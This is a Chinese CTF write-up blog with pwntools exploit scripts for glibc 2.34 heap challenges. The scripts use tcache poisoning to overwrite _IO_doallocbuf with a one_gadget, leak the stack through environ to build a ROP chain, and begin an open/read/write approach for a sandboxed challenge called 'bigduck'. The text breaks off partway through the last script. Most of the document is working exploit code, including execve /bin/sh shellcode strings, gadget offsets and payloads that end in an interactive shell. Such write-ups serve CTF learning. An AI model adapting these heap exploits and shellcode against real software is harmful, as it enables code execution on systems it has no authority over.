<h3 id="IO利用-IO-doallocbuf"><a href="#IO利用-IO-doallocbuf" class="headerlink" title="IO利用(_IO_doallocbuf)"></a>IO利用(_IO_doallocbuf)</h3><p>首先修改IO_doallocbuf为one_gadget，然后清空stdout结构体指针，使得libc重新调用IO_doallocbuf函数。</p>
<blockquote>
<p>第一次做glibc2.34的tcache有点不太熟练，比赛最后one_gadget错了，就差临门一脚，有点可惜。≧ ﹏ ≦</p>
</blockquote>
<span id="more"></span>

<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slibc</span>(<span class="params">leak_name, leak_addr, flag = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        libc_base = leak_addr - libc.symbols[<span class="built_in">str</span>(leak_name)]</span><br><span class="line">        sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        bin_sh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        libcsch = LibcSearcher(<span class="built_in">str</span>(leak_name), leak_addr)</span><br><span class="line">        libc_base = leak_addr - libcsch.dump(<span class="built_in">str</span>(leak_name))</span><br><span class="line">        sys_addr = libc_base + libcsch.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">        bin_sh = libc_base + libcsch.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [sys_addr, bin_sh]</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0xda861</span>, <span class="number">0xda864</span>, <span class="number">0xda867</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xda861 execve(&quot;/bin/sh&quot;, r13, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r13] == NULL || r13 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xda864 execve(&quot;/bin/sh&quot;, r13, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r13] == NULL || r13 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xda867 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">	sla(<span class="string">&quot;Choice: &quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">&quot;Choice: &quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&quot;Idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">&quot;Choice: &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&quot;Idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size, index, context</span>):</span><br><span class="line">	sla(<span class="string">&quot;Choice: &quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&quot;Idx: &quot;</span>, <span class="built_in">str</span>(index))	</span><br><span class="line">	sla(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))	</span><br><span class="line">	sa(<span class="string">&quot;Content: &quot;</span>, context)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fill tcache</span></span><br><span class="line">add() <span class="comment"># 0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add() <span class="comment"># 1 - 7</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	delete(i+<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">fd = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = fd - <span class="number">0x1f2cc0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">one_gadget = libc_base + one_gadget[<span class="number">1</span>]</span><br><span class="line">jump = libc_base + <span class="number">0x1f4560</span></span><br><span class="line">jump = jump + <span class="number">0x60</span></span><br><span class="line">stdout = libc_base + <span class="number">0x1f3760</span></span><br><span class="line">lg(<span class="string">&#x27;jump&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;stdout&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	add() <span class="comment"># 8 - 13</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recv()</span><br><span class="line"><span class="built_in">next</span> = u64(sh.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;next&#x27;</span>)</span><br><span class="line">fake_next = <span class="built_in">next</span> ^ jump</span><br><span class="line"></span><br><span class="line"><span class="comment"># change _IO_doallocbuf</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="number">2</span>, p64(fake_next))</span><br><span class="line">add() <span class="comment"># 14</span></span><br><span class="line">add() <span class="comment"># 15</span></span><br><span class="line">payload = <span class="number">2</span> * p64(one_gadget)</span><br><span class="line">edit(<span class="number">0x10</span>, <span class="number">15</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flush struct_stdout</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">fake_next = <span class="built_in">next</span> ^ stdout</span><br><span class="line">edit(<span class="number">8</span>, <span class="number">9</span>, p64(fake_next))</span><br><span class="line">add() <span class="comment"># 16</span></span><br><span class="line">add() <span class="comment"># 17</span></span><br><span class="line">edit(<span class="number">0x40</span>, <span class="number">17</span>, p64(<span class="number">0</span>)*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="堆栈结合-利用environ"><a href="#堆栈结合-利用environ" class="headerlink" title="堆栈结合(利用environ)"></a>堆栈结合(利用environ)</h3><p>利用environ泄露出栈地址，再分配堆块构造rop链。注意glibc2.23之后对分配的堆地址进行了检查，必须是0x10对齐；还有一点就是，题目中的edit函数和add函数的返回地址为同一个地址，所以在分配fake_chunk的时候要注意不能直接将堆块分配在返回地址附近，否则会造成返回地址的清空，程序报错；还有一点，edit的子函数不会对canary进行检查。</p>
<p>WP如下：</p>
<blockquote>
<p>提示：本人用的libc不是比赛给的libc，是glibc-all-in-one里面的2.34-0ubuntu3_amd64，忘记改回来了，所以wp里的偏移不能适用于原题。┭┮﹏┭┮</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slibc</span>(<span class="params">leak_name, leak_addr, flag = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        libc_base = leak_addr - libc.symbols[<span class="built_in">str</span>(leak_name)]</span><br><span class="line">        sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        bin_sh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        libcsch = LibcSearcher(<span class="built_in">str</span>(leak_name), leak_addr)</span><br><span class="line">        libc_base = leak_addr - libcsch.dump(<span class="built_in">str</span>(leak_name))</span><br><span class="line">        sys_addr = libc_base + libcsch.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">        bin_sh = libc_base + libcsch.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [sys_addr, bin_sh]</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">	sla(<span class="string">&quot;Choice: &quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">&quot;Choice: &quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&quot;Idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">&quot;Choice: &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&quot;Idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size, index, context</span>):</span><br><span class="line">	sla(<span class="string">&quot;Choice: &quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&quot;Idx: &quot;</span>, <span class="built_in">str</span>(index))	</span><br><span class="line">	sla(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))	</span><br><span class="line">	sa(<span class="string">&quot;Content: &quot;</span>, context)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fill tcache</span></span><br><span class="line">add() <span class="comment"># 0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add() <span class="comment"># 1 - 7</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	delete(i+<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">fd = uu64()</span><br><span class="line">libc_base = fd - <span class="number">0x218cc0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">environ = libc_base + libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002e6c5</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002d9b9</span></span><br><span class="line">lg(<span class="string">&#x27;environ&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	add()</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recv()</span><br><span class="line"><span class="built_in">next</span> = u64(sh.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;next&#x27;</span>)</span><br><span class="line">fake_next = <span class="built_in">next</span> ^ environ</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="number">2</span>, p64(fake_next))</span><br><span class="line">add() <span class="comment"># 14</span></span><br><span class="line">add() <span class="comment"># 15</span></span><br><span class="line">show(<span class="number">15</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">leak_stack = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;leak_stack&#x27;</span>)</span><br><span class="line">fake_addr = leak_stack - <span class="number">0x168</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make rop</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">fake_next = <span class="built_in">next</span> ^ fake_addr</span><br><span class="line">edit(<span class="number">8</span>, <span class="number">9</span>, p64(fake_next))</span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)</span><br><span class="line">edit(<span class="number">0x38</span>, <span class="number">17</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="bigduck"><a href="#bigduck" class="headerlink" title="bigduck"></a>bigduck</h2><p>这道题是上一道题的进阶，开启了沙盒禁用了execve，所以我们考虑用orw来解决问题，学习两种方法。</p>
<h3 id="堆栈结合-利用environ-1"><a href="#堆栈结合-利用environ-1" class="headerlink" title="堆栈结合(利用environ)"></a>堆栈结合(利用environ)</h3><p>注意一个坑，在泄露libc的时候，fd的低位为\x00，无法泄露fd，选择覆盖fd直至bk的低位一个字节，泄露bk。</p>
<blockquote>
<p>打比赛的时候踩坑了┭┮﹏┭┮</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> environ</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slibc</span>(<span class="params">leak_name, leak_addr, flag = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        libc_base = leak_addr - libc.symbols[<span class="built_in">str</span>(leak_name)]</span><br><span class="line">        sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        bin_sh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        libcsch = LibcSearcher(<span class="built_in">str</span>(leak_name), leak_addr)</span><br><span class="line">        libc_base = leak_addr - libcsch.dump(<span class="built_in">str</span>(leak_name))</span><br><span class="line">        sys_addr = libc_base + libcsch.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">        bin_sh = libc_base + libcsch.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [sys_addr, bin_sh]</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"><span class="comment"># set solib-search-path /home/zyy/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">	sla(<span class="string">&quot;Choice: &quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">&quot;Choice: &quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&quot;Idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">&quot;Choice: &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&quot;Idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size, index, context</span>):</span><br><span class="line">	sla(<span class="string">&quot;Choice: &quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&quot;Idx: &quot;</span>, <span class="built_in">str</span>(index))	</span><br><span class="line">	sla(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))	</span><br><span class="line">	sa(<span class="string">&quot;Content: &quot;</span>, context)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fill tcache</span></span><br><span class="line">add() <span class="comment"># 0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add() <span class="comment"># 1 - 7</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	delete(i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">9</span>, <span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span>)	<span class="comment"># LOWORD(fd)=0x00,fill fd-&gt;LOWORD(bk)</span></span><br><span class="line">show(<span class="number">0</span>)		<span class="comment"># leak bk</span></span><br><span class="line">libc_base = uu64() - <span class="number">0x1e0c61</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">op = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">rd = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pt = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;environ&#x27;</span>)</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000028a55</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000002a4cf</span></span><br><span class="line">pop_rdx_r12 = libc_base + <span class="number">0x0000000000112a51</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	add()	<span class="comment"># 8 - 13</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recv()</span><br><span class="line"><span class="built_in">next</span> = u64(sh.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;next&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">fake_next = <span class="built_in">next</span> ^ environ</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="number">2</span>, p64(fake_next))</span><br><span class="line">add() <span class="comment"># 14</span></span><br><span class="line">add() 